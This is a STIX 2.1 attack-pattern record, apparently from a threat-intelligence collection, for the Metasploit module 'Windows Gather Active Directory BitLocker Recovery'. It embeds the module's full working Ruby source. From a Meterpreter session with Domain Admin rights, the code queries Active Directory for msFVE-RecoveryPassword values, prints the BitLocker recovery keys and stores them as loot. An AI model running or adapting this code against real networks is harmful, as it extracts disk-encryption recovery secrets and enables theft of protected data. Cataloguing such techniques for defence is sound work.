{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--560fe431-088e-444b-9696-81f7fb7c0564",
    "created": "2024-08-14T16:33:05.008205Z",
    "modified": "2024-08-14T16:33:05.008209Z",
    "name": "Windows Gather Active Directory BitLocker Recovery",
    "description": " This module will enumerate BitLocker recovery passwords in the default AD directory. This module does require Domain Admin or other delegated privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ad_bitlocker.rb",
            "external_id": "enum_ad_bitlocker.rb"
        },
        {
            "source_name": "reference",
            "url": "https://technet.microsoft.com/en-us/library/cc771778%28v=ws.10%29.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Active Directory BitLocker Recovery',\n        'Description' => %q{\n          This module will enumerate BitLocker recovery passwords in the default AD\n          directory. This module does require Domain Admin or other delegated privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Ben Campbell <ben.campbell[at]mwrinfosecurity.com>'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'References' => [\n          ['URL', 'https://technet.microsoft.com/en-us/library/cc771778%28v=ws.10%29.aspx']\n        ]\n      )\n    )\n\n    register_options([\n      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),\n      OptString.new('FIELDS', [true, 'FIELDS to retrieve.', 'distinguishedName,msFVE-RecoveryPassword']),\n      OptString.new('FILTER', [true, 'Search filter.', '(objectClass=msFVE-RecoveryInformation)'])\n    ])\n  end\n\n  def run\n    fields = datastore['FIELDS'].gsub(/\\s+/, '').split(',')\n    search_filter = datastore['FILTER']\n    max_search = datastore['MAX_SEARCH']\n\n    begin\n      q = query(search_filter, max_search, fields)\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      print_error(e.message)\n      return\n    end\n\n    if q.nil? || q[:results].empty?\n      print_status('No results found...')\n      return\n    end\n\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'BitLocker Recovery Passwords',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => fields\n    )\n\n    q[:results].each do |result|\n      row = []\n\n      result.each do |field|\n        field_value = (field.nil? ? '' : field[:value])\n        row << field_value\n      end\n\n      results_table << row\n    end\n\n    print_line results_table.to_s\n\n    if datastore['STORE_LOOT']\n      stored_path = store_loot('bitlocker.recovery', 'text/plain', session, results_table.to_csv)\n      print_good(\"Results saved to: #{stored_path}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}